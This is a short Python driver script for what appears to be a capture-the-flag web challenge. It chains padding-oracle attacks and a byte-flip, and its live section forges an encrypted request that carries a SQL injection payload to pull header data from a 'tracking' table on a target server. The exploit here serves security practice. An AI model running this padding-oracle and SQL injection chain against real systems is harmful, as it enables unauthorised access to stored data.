'''
This is the main file where the magic happens
'''
#### FLAG 0 ####
# Just cause any 50X error

#### FLAG 1 ####
# from flag_1 import padding_oracle
# flag_1 = padding_oracle(use_skips=False)
# print(flag_1)

# exit()

#### FLAG 2 ####
# from flag_2 import byte_flip
# flag_2 = byte_flip()
# print(flag_2)

# exit()


#### FLAG 3 ####
# from flag_2 import byte_flip
# result = byte_flip('a', True)
# print(result.text)

from help import make_request
from settings import TARGET
from flag_3 import padding_oracle_encrypt, prepareMessage

# The actual message we want to send
message = '{"id":"0 UNION SELECT group_concat(headers), '' from tracking", "key": "XjPkmljch5E2sMiNhsNiqg~~"}'
#          |--------------||--------------||--------------||--------------||--------------||--------------||--------------|

intermediaries = padding_oracle_encrypt(
    message=message,
    use_skips=True
)

xoredMessage = prepareMessage(
    message=message,
    intermediaries=intermediaries
)

result = make_request(TARGET, xoredMessage, return_raw=True)


print(result.text)
